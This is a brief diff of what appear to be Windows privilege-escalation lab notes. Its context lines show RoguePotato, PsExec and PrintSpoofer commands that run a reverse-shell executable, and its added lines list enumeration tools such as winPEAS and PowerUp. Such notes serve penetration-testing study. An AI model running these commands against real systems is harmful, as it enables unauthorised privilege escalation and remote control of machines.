@@ -105,3 +105,8 @@ C:\PrivEsc\RoguePotato.exe -r <MACHINE_IP> -e "C:\PrivEsc\reverse.exe" -l 9999
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
 C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
 
+【13. その他ツール】
+winPEASany.exe
+Seatbelt.exe
+PowerUp.ps1
+SharpUp.exe
